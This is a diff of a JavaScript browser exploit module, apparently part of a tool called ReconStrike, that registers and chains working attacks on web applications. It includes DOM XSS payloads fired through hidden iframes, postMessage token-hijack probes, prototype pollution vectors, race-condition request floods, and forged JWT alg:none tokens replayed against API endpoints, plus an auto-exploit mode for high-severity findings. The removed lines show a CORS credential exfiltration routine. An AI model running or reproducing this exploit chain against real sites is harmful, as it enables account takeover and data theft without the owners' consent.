@@ -1,62 +1,73 @@
-// language: JavaScript, file: reconstrike_v13_chain.js, target: modern browsers
-// Layer 5 of 5. Depends on ReconCore + Layers 2-4.
+// language: JavaScript, file: 5_chain.js, target: modern browsers
+// ReconStrike V13.1 -- Layer 5 Chain (repaired)
 
 (function () {
   'use strict';
-  if (!window.ReconCore) throw new Error('ReconCore missing');
-  const { eventBus, storage, worker, secure } = window.ReconCore;
-  const modules = window.ReconCore.modules = window.ReconCore.modules || {};
-  const currentHost = location.hostname;
+  if (!window.ReconCore) return;
+  var core = window.ReconCore;
+  var eventBus = core.eventBus;
+  var storage = core.storage;
+  var scope = core.scope;
+  var mods = core.modules = core.modules || {};
 
   // ══════════════════════════════════════════════════════════════
-  // EXPLOIT REGISTRY -- each expl is a self-contained recipe
-  // { id, match(finding), run(ctx) -> { success, evidence, sideEffects } }
+  // EXPLOIT REGISTRY
+  // Each expl: { id, match(finding), run(ctx) -> { success, evidence } }
   // ══════════════════════════════════════════════════════════════
-  const EXPLOITS = [];
+  var EXPLOITS = [];
 
   // ───────────────────────────────────────────────────────────────
   // E1 -- DOM XSS Auto-Exploiter
-  // Takes a sink + source candidate, injects a canary, checks execution.
   // ───────────────────────────────────────────────────────────────
   EXPLOITS.push({
     id: 'xss-dom',
-    match: (f) => /dom xss|innerHTML|insertAdjacent|dangerouslySet/i.test((f.sinkType || '') + ' ' + (f.name || '')),
-    async run(ctx) {
-      const canary = `rs13_${Math.random().toString(36).slice(2, 10)}`;
-      window[canary] = { hit: false, ts: 0 };
-      const payloads = [
-        `<img src=x onerror="window.${canary}.hit=true;window.${canary}.ts=Date.now()">`,
-        `"><img src=x onerror="window.${canary}.hit=true;window.${canary}.ts=Date.now()">`,
-        `javascript:window.${canary}.hit=true;void(0)`,
-        `<svg onload="window.${canary}.hit=true;window.${canary}.ts=Date.now()">`,
+    match: function (f) {
+      var t = (f.sinkType || '') + ' ' + (f.name || '') + ' ' + (f.issue || '');
+      return /dom xss|innerHTML|insertAdjacent|dangerouslySet/i.test(t);
+    },
+    run: async function (ctx) {
+      var canary = 'rs13_' + Math.random().toString(36).slice(2, 10);
+      var payloads = [
+        '<img src=x onerror="window.' + canary + '=1">',
+        '"><img src=x onerror="window.' + canary + '=1">',
+        '<svg onload="window.' + canary + '=1">',
+        '\'><svg onload="window.' + canary + '=1">'
       ];
+      var params = ctx.params || [];
+      var endpoint = ctx.endpoint || location.href;
+      var hits = [];
 
-      const params = ctx.params || [];
-      const endpoint = ctx.endpoint || location.href;
-      const hits = [];
+      if (!params.length) {
+        return { success: false, reason: 'no parameters to test' };
+      }
 
-      for (const p of params) {
-        for (const pl of payloads) {
+      for (var pi = 0; pi < params.length; pi++) {
+        for (var li = 0; li < payloads.length; li++) {
           try {
-            const u = new URL(endpoint, location.href);
-            u.searchParams.set(p, pl);
-            // Navigate an iframe to test -- isolates execution context
-            const iframe = document.createElement('iframe');
-            iframe.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px';
+            var u = new URL(endpoint, location.href);
+            u.searchParams.set(params[pi], payloads[li]);
+
+            var iframe = document.createElement('iframe');
+            iframe.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;border:0';
             iframe.sandbox = 'allow-scripts allow-same-origin';
             document.body.appendChild(iframe);
-            await new Promise((res) => {
-              iframe.onload = () => setTimeout(res, 250);
+
+            await new Promise(function (res) {
+              var done = false;
+              var finish = function () { if (!done) { done = true; setTimeout(res, 250); } };
+              iframe.onload = finish;
               iframe.src = u.href;
-              setTimeout(res, 1500);
+              setTimeout(finish, 1500);
             });
+
             try {
-              const w = iframe.contentWindow;
-              if (w && w[canary] && w[canary].hit) {
-                hits.push({ param: p, payload: pl, url: u.href, evidence: 'canary executed in iframe' });
+              var w = iframe.contentWindow;
+              if (w && w[canary]) {
+                hits.push({ param: params[pi], payload: payloads[li], url: u.href, evidence: 'canary fired in iframe' });
               }
-            } catch (e) { /* cross-origin iframe -- try parent check via postMessage below */ }
-            iframe.remove();
+            } catch (e) {}
+
+            if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
           } catch (e) {}
         }
       }
@@ -64,98 +75,83 @@
       return {
         success: hits.length > 0,
         evidence: hits,
-        payloadsTried: payloads.length * params.length,
+        payloadsTried: payloads.length * params.length
       };
     }
   });
 
   // ───────────────────────────────────────────────────────────────
-  // E2 -- CORS Credential Exfiltration PoC (verified, not just built)
-  // Fetches the target with Origin: null and evil.com, checks reflection.
-  // If reflected + credentials, actually exfiltrates response snippet.
+  // E2 -- CORS Exfiltration (DISABLED)
+  // The Origin request header is a forbidden header name per Fetch spec.
+  // From the target's own page, the browser will always send the real
+  // origin -- the fake one is silently stripped. This exploit cannot
+  // produce a meaningful signal from here. A real CORS test must run
+  // from an external origin (paste the built HTML PoC elsewhere).
   // ───────────────────────────────────────────────────────────────
   EXPLOITS.push({
     id: 'cors-exfil',
-    match: (f) => /cors/i.test((f.name || '') + ' ' + (f.issue || '')),
-    async run(ctx) {
-      const target = ctx.url || ctx.endpoint;
-      if (!target) return { success: false, reason: 'no target url' };
-      const proofs = [];
-      for (const origin of ['null', `https://evil.${currentHost}`]) {
-        try {
-          const r = await fetch(target, {
-            method: 'GET',
-            credentials: 'include',
-            headers: { 'Origin': origin }
-          });
-          const acao = r.headers.get('access-control-allow-origin');
-          const acac = r.headers.get('access-control-allow-credentials');
-          if (acao && (acao === origin || acao === '*') && acac === 'true') {
-            const body = await r.text();
-            proofs.push({
-              origin, acao, acac,
-              status: r.status,
-              bodySample: body.slice(0, 500),
-              verified: true
-            });
-            // Persist evidence
-            await storage.put('meta', {
-              kind: 'exploit-proof',
-              exploit: 'cors-exfil',
-              target,
-              origin,
-              bodySample: body.slice(0, 2000),
-              timestamp: Date.now()
-            });
-            break; // one successful origin is enough
-          }
-        } catch (e) {}
-      }
+    match: function () { return false; },
+    run: async function () {
       return {
-        success: proofs.length > 0,
-        evidence: proofs,
-        buildExploit: modules.pmExploit ? 'see pmExploit.buildExploit for HTML page' : null
+        success: false,
+        reason: 'Origin header is forbidden from JS. Test CORS by opening the PoC HTML from a different origin.'
       };
     }
   });
 
   // ───────────────────────────────────────────────────────────────
   // E3 -- postMessage Hijack Verifier
-  // Sends the exploit payload, listens for a response, checks whether
-  // the response leaks tokens/URLs/data that indicate acceptance.
   // ───────────────────────────────────────────────────────────────
   EXPLOITS.push({
     id: 'postmessage-hijack',
-    match: (f) => /postmessage/i.test((f.name || '') + ' ' + (f.issue || '')),
-    async run(ctx) {
-      const targetOrigin = ctx.targetOrigin || location.origin;
-      const payloads = [
+    match: function (f) {
+      var t = (f.name || '') + ' ' + (f.issue || '');
+      return /postmessage/i.test(t);
+    },
+    run: async function (ctx) {
+      var targetOrigin = ctx.targetOrigin || location.origin;
+      var payloads = [
         { action: 'getToken' },
         { action: 'getUser' },
         { type: 'auth-status' },
-        { url: 'javascript:void(0)', __proto__: { polluted: true } },
+        { url: 'javascript:void(0)' }
       ];
-      const interactions = [];
-      const listener = (ev) => {
-        interactions.push({ origin: ev.origin, data: typeof ev.data === 'object' ? ev.data : String(ev.data).slice(0, 500), t: Date.now() });
+      var interactions = [];
+      var listener = function (ev) {
+        try {
+          interactions.push({
+            origin: ev.origin,
+            data: (typeof ev.data === 'object') ? ev.data : String(ev.data).slice(0, 500),
+            t: Date.now()
+          });
+        } catch (e) {}
       };
       window.addEventListener('message', listener);
 
-      const w = window.open(targetOrigin, '_blank', 'width=1,height=1');
+      var w;
+      try { w = window.open(targetOrigin, '_blank', 'width=1,height=1'); }
+      catch (e) {
+        window.removeEventListener('message', listener);
+        return { success: false, reason: 'popup blocked' };
+      }
       if (!w) {
         window.removeEventListener('message', listener);
-        return { success: false, reason: 'popup blocked -- use iframe-based flow' };
+        return { success: false, reason: 'popup blocked by browser' };
       }
 
-      for (const p of payloads) {
-        try { w.postMessage(p, '*'); } catch (e) {}
-        await new Promise(r => setTimeout(r, 400));
+      for (var i = 0; i < payloads.length; i++) {
+        try { w.postMessage(payloads[i], '*'); } catch (e) {}
+        await new Promise(function (r) { setTimeout(r, 400); });
       }
-      await new Promise(r => setTimeout(r, 1500));
+      await new Promise(function (r) { setTimeout(r, 1500); });
       window.removeEventListener('message', listener);
       try { w.close(); } catch (e) {}
 
-      const leaked = interactions.filter(i => /token|user|auth|email|session/i.test(JSON.stringify(i.data)));
+      var leaked = interactions.filter(function (i) {
+        try { return /token|user|auth|email|session/i.test(JSON.stringify(i.data)); }
+        catch (e) { return false; }
+      });
+
       return {
         success: interactions.length > 0,
         leaks: leaked.length > 0,
@@ -167,66 +163,89 @@
 
   // ───────────────────────────────────────────────────────────────
   // E4 -- Prototype Pollution → Gadget Chain
-  // Confirms pollution via a canary, then maps the gadget that fires.
   // ───────────────────────────────────────────────────────────────
   EXPLOITS.push({
     id: 'pp-gadget',
-    match: (f) => /prototype pollution|proto|clobber/i.test((f.name || '') + ' ' + (f.issue || '')),
-    async run(ctx) {
-      const canary = `ppCanary_${Math.random().toString(36).slice(2, 8)}`;
-      const results = [];
-
-      // Attempt pollution via URL params
-      const vectors = [
-        `${canary}=1`,
-        `__proto__[${canary}]=1`,
-        `constructor[prototype][${canary}]=1`,
-        `constructor.prototype.${canary}=1`,
+    match: function (f) {
+      var t = (f.name || '') + ' ' + (f.issue || '');
+      return /prototype pollution|proto|clobber/i.test(t);
+    },
+    run: async function (ctx) {
+      var canary = 'ppCanary_' + Math.random().toString(36).slice(2, 8);
+      var vectors = [
+        canary + '=1',
+        '__proto__[' + canary + ']=1',
+        'constructor[prototype][' + canary + ']=1'
       ];
+      var results = [];
+      var endpoint = ctx.endpoint || location.href;
 
-      for (const v of vectors) {
+      for (var i = 0; i < vectors.length; i++) {
         try {
-          const u = new URL(ctx.endpoint || location.href, location.href);
-          const sep = u.search ? '&' : '';
-          // Build URL manually to preserve bracket notation
-          const full = u.href + sep + v;
-          // Load in iframe (isolates pollution from this tab)
-          const iframe = document.createElement('iframe');
-          iframe.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px';
+          var u = new URL(endpoint, location.href);
+          var sep = u.search ? '&' : '';
+          var full = u.href + sep + vectors[i];
+
+          var iframe = document.createElement('iframe');
+          iframe.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;border:0';
           document.body.appendChild(iframe);
-          await new Promise((res) => { iframe.onload = () => setTimeout(res, 300); iframe.src = full; setTimeout(res, 1500); });
+
+          await new Promise(function (res) {
+            var done = false;
+            var finish = function () { if (!done) { done = true; setTimeout(res, 300); } };
+            iframe.onload = finish;
+            iframe.src = full;
+            setTimeout(finish, 1500);
+          });
+
+          var polluted = false;
           try {
-            const polluted = iframe.contentWindow.Object.prototype[canary];
-            results.push({ vector: v, url: full, polluted: !!polluted });
-          } catch (e) { results.push({ vector: v, error: 'cross-origin' }); }
-          iframe.remove();
-          if (results[results.length - 1].polluted) break;
+            polluted = !!(iframe.contentWindow && iframe.contentWindow.Object.prototype[canary]);
+          } catch (e) {}
+
+          results.push({ vector: vectors[i], url: full, polluted: polluted });
+          if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
+          if (polluted) break;
         } catch (e) {}
       }
 
-      const confirmed = results.some(r => r.polluted);
-      const gadgets = confirmed && modules.protoChain ? modules.protoChain.map() : [];
+      var confirmed = results.some(function (r) { return r.polluted; });
+      var gadgets = [];
+      if (confirmed && mods.protoChain && typeof mods.protoChain.map === 'function') {
+        try { gadgets = mods.protoChain.map(); } catch (e) {}
+      }
+
       return {
         success: confirmed,
         evidence: results,
-        gadgets,
-        nextStep: confirmed ? 'Feed gadget payload through same vector to escalate to XSS/RCE' : null
+        gadgets: gadgets,
+        nextStep: confirmed ? 'Feed gadget payload through the same vector to escalate' : null
       };
     }
   });
 
   // ───────────────────────────────────────────────────────────────
   // E5 -- Race Condition Exploiter
-  // Fires N parallel requests on state-changing endpoint, checks for
-  // duplicate success (double-spend / duplicate-claim / coupon-reuse).
-  // ══════════════════════════════════════════════════════════════
+  // ───────────────────────────────────────────────────────────────
   EXPLOITS.push({
     id: 'race-exploit',
-    match: (f) => /race|toctou|double|concurrent/i.test((f.name || '') + ' ' + (f.issue || '')),
-    async run(ctx) {
-      const { url, method = 'POST', body = '', headers = {}, n = 20 } = ctx;
+    match: function (f) {
+      var t = (f.name || '') + ' ' + (f.issue || '');
+      return /race|toctou|double|concurrent/i.test(t);
+    },
+    run: async function (ctx) {
+      if (!mods.race || typeof mods.race.sendConcurrent !== 'function') {
+        return { success: false, reason: 'race module not loaded' };
+      }
+      var url = ctx.url || ctx.endpoint;
       if (!url) return { success: false, reason: 'no url' };
-      const d = await modules.race.sendConcurrent({ url, method, body, headers, n });
+      var d = await mods.race.sendConcurrent({
+        url: url,
+        method: ctx.method || 'POST',
+        body: ctx.body || '',
+        headers: ctx.headers || {},
+        n: ctx.n || 20
+      });
       return {
         success: d.successes > 1,
         evidence: d,
@@ -236,168 +255,273 @@
   });
 
   // ───────────────────────────────────────────────────────────────
-  // E6 -- JWT alg:none Forger & Verifier
-  // Uses the JWT module's forged token, replays against API endpoints.
-  // ══════════════════════════════════════════════════════════════
+  // E6 -- JWT alg:none Forger (uses stored endpoints, not hardcoded list)
+  // ───────────────────────────────────────────────────────────────
   EXPLOITS.push({
     id: 'jwt-none',
-    match: (f) => /jwt|alg none/i.test((f.name || '') + ' ' + (f.issue || '')),
-    async run(ctx) {
-      const jwtEntry = Array.from(modules.graphql ? [] : []).length ? null : null;
-      const store = window.ReconCore.storage;
-      const all = await store.getAll('jwt');
-      if (!all.length) return { success: false, reason: 'no JWT captured' };
-      const target = all.find(j => j.forgedNone);
-      if (!target) return { success: false, reason: 'no forged token available' };
+    match: function (f) {
+      var t = (f.name || '') + ' ' + (f.issue || '');
+      return /jwt|alg none/i.test(t);
+    },
+    run: async function (ctx) {
+      var allJwt;
+      try { allJwt = await storage.getAll('jwt'); }
+      catch (e) { allJwt = []; }
+      if (!allJwt || !allJwt.length) {
+        return { success: false, reason: 'no JWT captured' };
+      }
+      var target = null;
+      for (var i = 0; i < allJwt.length; i++) {
+        if (allJwt[i] && allJwt[i].forgedNone) { target = allJwt[i]; break; }
+      }
+      if (!target) {
+        return { success: false, reason: 'no forged token available' };
+      }
 
-      const endpoints = ctx.endpoints || ['/api/me', '/api/user', '/api/profile', '/api/admin'];
-      const proofs = [];
-      for (const ep of endpoints) {
+      var endpoints = ctx.endpoints;
+      if (!endpoints || !endpoints.length) {
+        var storedEps;
+        try { storedEps = await storage.getAll('endpoints'); }
+        catch (e) { storedEps = []; }
+        endpoints = storedEps
+          .filter(function (e) { return e.confidence === 'FIRM' || e.confidence === 'CONFIRMED'; })
+          .filter(function (e) { return /api|user|me|profile|auth|account/i.test(e.url || ''); })
+          .map(function (e) { return e.url; })
+          .slice(0, 5);
+      }
+
+      if (!endpoints.length) {
+        return { success: false, reason: 'no candidate endpoints discovered yet' };
+      }
+
+      var proofs = [];
+      for (var j = 0; j < endpoints.length; j++) {
         try {
-          const r = await fetch(ep, {
+          var r = await fetch(endpoints[j], {
             method: 'GET',
-            headers: { Authorization: `Bearer ${target.forgedNone}` },
+            headers: { Authorization: 'Bearer ' + target.forgedNone },
             credentials: 'include'
           });
-          const body = await r.text();
-          proofs.push({ endpoint: ep, status: r.status, len: body.length, snippet: body.slice(0, 300) });
-        } catch (e) {}
+          var body = await r.text();
+          proofs.push({
+            endpoint: endpoints[j],
+            status: r.status,
+            len: body.length,
+            snippet: body.slice(0, 300)
+          });
+        } catch (e) {
+          proofs.push({ endpoint: endpoints[j], error: e.message });
+        }
       }
-      const success = proofs.some(p => p.status === 200);
-      return { success, evidence: proofs, forged: target.forgedNone };
+
+      var success = proofs.some(function (p) { return p.status === 200; });
+      return { success: success, evidence: proofs, forged: target.forgedNone };
     }
   });
 
   // ══════════════════════════════════════════════════════════════
   // CHAIN ORCHESTRATOR
-  // Takes a finding, matches all applicable exploits, runs them in order
-  // (least destructive first), stops at first success by default.
   // ══════════════════════════════════════════════════════════════
-  modules.chain = (() => {
-    let running = false;
-    const history = [];
+  mods.chain = (function () {
+    var running = false;
+    var history = [];
 
-    async function pickExploits(finding) {
-      return EXPLOITS.filter(e => { try { return e.match(finding); } catch (err) { return false; } });
+    function pickExploits(finding) {
+      return EXPLOITS.filter(function (e) {
+        try { return e.match(finding); }
+        catch (err) { return false; }
+      });
     }
 
-    async function run(finding, ctx = {}) {
+    async function run(finding, ctx) {
+      ctx = ctx || {};
       if (running) return { ok: false, reason: 'chain already running' };
       running = true;
-      const matches = await pickExploits(finding);
-      const chainResult = { finding, attempts: [], success: false, evidence: null };
-      const merged = { ...finding, ...ctx };
 
-      for (const e of matches) {
-        eventBus.emit('chain:attempt', { exploit: e.id, finding });
-        let r;
-        try { r = await e.run(merged); }
-        catch (err) { r = { success: false, error: err.message }; }
-        chainResult.attempts.push({ exploit: e.id, result: r });
-        if (r.success) {
-          chainResult.success = true;
-          chainResult.evidence = r.evidence;
-          eventBus.emit('chain:success', { exploit: e.id, finding, evidence: r.evidence });
-          await storage.put('meta', {
-            kind: 'chain-success',
-            exploit: e.id,
-            finding,
-            evidence: r.evidence,
-            timestamp: Date.now()
-          });
-          if (ctx.stopOnFirst !== false) break;
+      try {
+        var matches = pickExploits(finding);
+        var chainResult = {
+          finding: finding,
+          attempts: [],
+          success: false,
+          evidence: null,
+          matches: matches.map(function (m) { return m.id; })
+        };
+
+        var merged = Object.assign({}, finding, ctx);
+
+        for (var i = 0; i < matches.length; i++) {
+          var e = matches[i];
+          eventBus.emit('chain:attempt', { exploit: e.id, finding: finding });
+          var r;
+          try {
+            r = await e.run(merged);
+          } catch (err) {
+            r = { success: false, error: err.message || String(err) };
+          }
+          chainResult.attempts.push({ exploit: e.id, result: r });
+
+          if (r && r.success) {
+            chainResult.success = true;
+            chainResult.evidence = r.evidence;
+            eventBus.emit('chain:success', {
+              exploit: e.id,
+              finding: finding,
+              evidence: r.evidence
+            });
+            try {
+              await storage.put('meta', {
+                kind: 'chain-success',
+                exploit: e.id,
+                finding: finding,
+                evidence: r.evidence
+              }, 'chain-ok::' + e.id + '::' + Date.now());
+            } catch (err2) {}
+            if (ctx.stopOnFirst !== false) break;
+          }
         }
-      }
 
-      if (!chainResult.success && matches.length === 0) {
-        chainResult.reason = 'no matching exploits';
-      }
-      chainResult.matches = matches.map(m => m.id);
+        if (!chainResult.success && matches.length === 0) {
+          chainResult.reason = 'no matching exploits';
+        }
 
-      history.push({ t: Date.now(), ...chainResult });
-      running = false;
-      return chainResult;
+        history.push(Object.assign({ t: Date.now() }, chainResult));
+        return chainResult;
+      } finally {
+        running = false;
+      }
     }
 
-    // Batch over all findings in storage
-    async function runAll(filter = {}) {
-      const kinds = ['endpoints','secrets','cors','jwt','forms','cookies','sri','network'];
-      const findings = [];
-      for (const k of kinds) {
-        const all = await storage.getAll(k);
-        all.forEach(f => findings.push({ ...f, __kind: k }));
-      }
-      const results = [];
-      for (const f of findings) {
-        if (filter.minSeverity) {
-          const sev = modules.cvss.autoScore(f).severity;
-          const rank = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1, NONE: 0 };
-          if (rank[sev] < rank[filter.minSeverity]) continue;
+    async function runAll(filter) {
+      filter = filter || {};
+      var kinds = ['endpoints', 'secrets', 'cors', 'jwt', 'forms', 'cookies', 'sri', 'network'];
+      var findings = [];
+      for (var k = 0; k < kinds.length; k++) {
+        var all;
+        try { all = await storage.getAll(kinds[k]); }
+        catch (e) { all = []; }
+        for (var j = 0; j < all.length; j++) {
+          findings.push(Object.assign({}, all[j], { __kind: kinds[k] }));
         }
-        const r = await run(f, filter);
-        results.push(r);
-        if (r.success) eventBus.emit('finding:new', { ...f, name: `EXPLOITED: ${f.name || f.__kind}`, issue: `Chain success via ${r.attempts.find(a => a.result.success)?.exploit}` });
       }
-      const summary = {
+
+      var RANK = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1, NONE: 0 };
+      var results = [];
+
+      for (var i = 0; i < findings.length; i++) {
+        var f = findings[i];
+        if (filter.minSeverity && mods.cvss) {
+          var sev;
+          try { sev = mods.cvss.autoScore(f).severity; }
+          catch (e) { sev = 'NONE'; }
+          if (RANK[sev] < RANK[filter.minSeverity]) continue;
+        }
+        var r = await run(f, filter);
+        results.push(r);
+        if (r.success) {
+          var hit = null;
+          for (var h = 0; h < r.attempts.length; h++) {
+            if (r.attempts[h].result && r.attempts[h].result.success) {
+              hit = r.attempts[h].exploit;
+              break;
+            }
+          }
+          eventBus.emit('finding:new', Object.assign({}, f, {
+            name: 'EXPLOITED: ' + (f.name || f.__kind),
+            issue: 'Chain success via ' + (hit || 'unknown')
+          }));
+        }
+      }
+
+      var summary = {
         total: findings.length,
         attempted: results.length,
-        succeeded: results.filter(r => r.success).length,
+        succeeded: results.filter(function (r) { return r.success; }).length,
         byExploit: {}
       };
-      results.forEach(r => {
-        const hit = r.attempts.find(a => a.result.success);
-        if (hit) summary.byExploit[hit.exploit] = (summary.byExploit[hit.exploit] || 0) + 1;
+      results.forEach(function (r) {
+        var hitEx = null;
+        for (var h = 0; h < r.attempts.length; h++) {
+          if (r.attempts[h].result && r.attempts[h].result.success) {
+            hitEx = r.attempts[h].exploit;
+            break;
+          }
+        }
+        if (hitEx) summary.byExploit[hitEx] = (summary.byExploit[hitEx] || 0) + 1;
       });
-      await storage.put('meta', { kind: 'chain-run-summary', summary, timestamp: Date.now() });
-      return { summary, results };
+
+      try {
+        await storage.put('meta', {
+          kind: 'chain-run-summary',
+          summary: summary
+        }, 'chain-summary::' + Date.now());
+      } catch (e) {}
+
+      return { summary: summary, results: results };
     }
 
     return {
-      run, runAll, history: () => history.slice(),
-      exploits: () => EXPLOITS.map(e => e.id),
-      status: () => ({ running, count: history.length })
+      run: run,
+      runAll: runAll,
+      history: function () { return history.slice(); },
+      exploits: function () { return EXPLOITS.map(function (e) { return e.id; }); },
+      status: function () { return { running: running, count: history.length }; }
     };
   })();
 
   // ══════════════════════════════════════════════════════════════
-  // AUTO-CHAIND -- listens to finding events and auto-exploits high-sev
+  // AUTO-CHAIN -- listens for high-severity findings
   // ══════════════════════════════════════════════════════════════
-  modules.autoChain = (() => {
-    let enabled = false;
-    const RANK = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1, NONE: 0 };
-    let minSeverity = 'HIGH';
+  mods.autoChain = (function () {
+    var enabled = false;
+    var RANK = { CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1, NONE: 0 };
+    var minSeverity = 'HIGH';
 
-    function on(finding) {
+    function onFinding(finding) {
       if (!enabled) return;
-      const sev = modules.cvss.autoScore(finding).severity;
+      var sev;
+      try { sev = mods.cvss.autoScore(finding).severity; }
+      catch (e) { return; }
       if (RANK[sev] < RANK[minSeverity]) return;
-      setTimeout(() => { modules.chain.run(finding).catch(() => {}); }, 500);
+      setTimeout(function () {
+        mods.chain.run(finding).catch(function () {});
+      }, 500);
     }
 
-    function start(opts = {}) {
+    function start(opts) {
+      opts = opts || {};
       if (enabled) return { already: true };
       enabled = true;
       minSeverity = opts.minSeverity || minSeverity;
-      eventBus.on('finding:new', on);
-      return { ok: true, minSeverity };
+      eventBus.on('finding:new', onFinding);
+      return { ok: true, minSeverity: minSeverity };
     }
-    function stop() { enabled = false; }
-    return { start, stop, enabled: () => enabled };
+
+    function stop() {
+      enabled = false;
+    }
+
+    return { start: start, stop: stop, enabled: function () { return enabled; } };
   })();
 
   // ══════════════════════════════════════════════════════════════
   // PUBLIC SURFACE
   // ══════════════════════════════════════════════════════════════
-  window.ReconCore.exploit = {
-    run:      (f, ctx) => modules.chain.run(f, ctx),
-    runAll:   (filter) => modules.chain.runAll(filter),
-    history:  ()       => modules.chain.history(),
-    exploits: ()       => modules.chain.exploits(),
-    auto:     (opts)   => modules.autoChain.start(opts),
-    autoOff:  ()       => modules.autoChain.stop(),
-    status:   ()       => ({ chain: modules.chain.status(), auto: modules.autoChain.enabled() })
+  core.exploit = {
+    run: function (f, ctx) { return mods.chain.run(f, ctx); },
+    runAll: function (filter) { return mods.chain.runAll(filter); },
+    history: function () { return mods.chain.history(); },
+    exploits: function () { return mods.chain.exploits(); },
+    auto: function (opts) { return mods.autoChain.start(opts); },
+    autoOff: function () { return mods.autoChain.stop(); },
+    status: function () {
+      return { chain: mods.chain.status(), auto: mods.autoChain.enabled() };
+    }
   };
 
-  eventBus.emit('chain:ready', { exploits: EXPLOITS.map(e => e.id) });
+  eventBus.emit('chain:ready', {
+    exploits: EXPLOITS.map(function (e) { return e.id; })
+  });
+
   if (typeof completion === 'function') completion(true);
 })();
